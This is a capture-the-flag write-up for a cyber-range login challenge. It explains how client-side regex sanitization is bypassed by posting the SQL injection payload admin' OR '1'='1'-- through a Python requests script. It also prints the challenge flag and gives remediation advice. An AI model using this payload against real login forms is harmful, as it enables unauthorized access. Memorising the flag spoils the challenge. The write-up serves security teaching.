# Web Login Bypass Challenge - Writeup

## Challenge Overview
- **Target URL**: https://sanitize.challenges.virginiacyberrange.net/login
- **Challenge Type**: Web Application Security / SQL Injection
- **Flag**: `flag{s4n4t1z3_y0ur_d4t4_1npu75}`

## Vulnerability Analysis

### Client-Side Sanitization
The login form includes JavaScript that sanitizes the username input:
```javascript
$('#login-form').submit(function() {
    var txt = $("#uname").val();
    txt = txt.replace(/[^a-zA-Z 0-9]+/g, '')
    $("#uname").val(txt);
    return true;
});
```

This regex pattern `/[^a-zA-Z 0-9]+/g` removes all special characters except:
- Letters (a-z, A-Z)
- Numbers (0-9)
- Spaces

### The Security Flaw
The critical vulnerability is that **client-side sanitization can always be bypassed** by making direct HTTP requests to the server, completely avoiding the JavaScript validation.

## Exploitation Method

### Step 1: Direct HTTP Request
Instead of submitting through the browser form, we sent a direct POST request to `/login` endpoint using Python:

```python
import requests

url = "https://sanitize.challenges.virginiacyberrange.net/login"
data = {
    'username': "admin' OR '1'='1'--",
    'password': "password"
}

response = requests.post(url, data=data)
```

### Step 2: SQL Injection Payload
The payload `admin' OR '1'='1'--` works because:
- `admin'` - Closes the username string in the SQL query
- `OR '1'='1'` - Creates a condition that's always true
- `--` - Comments out the rest of the SQL query (including password check)

### Step 3: Server Response
The server returned a success message with the flag:
```html
<div class="alert alert-success alert-dismissible fade show" role="alert">
    Logged in successfully! flag{s4n4t1z3_y0ur_d4t4_1npu75}
</div>
```

## Key Lessons

1. **Never rely solely on client-side validation** for security
2. **Always implement server-side input validation** and sanitization
3. **Use parameterized queries** to prevent SQL injection
4. **Client-side controls are for user experience**, not security

## Remediation
To fix this vulnerability:
- Implement proper server-side input validation
- Use parameterized SQL queries or prepared statements
- Add proper authentication mechanisms
- Implement rate limiting and account lockout policies

---
**Flag**: `flag{s4n4t1z3_y0ur_d4t4_1npu75}`

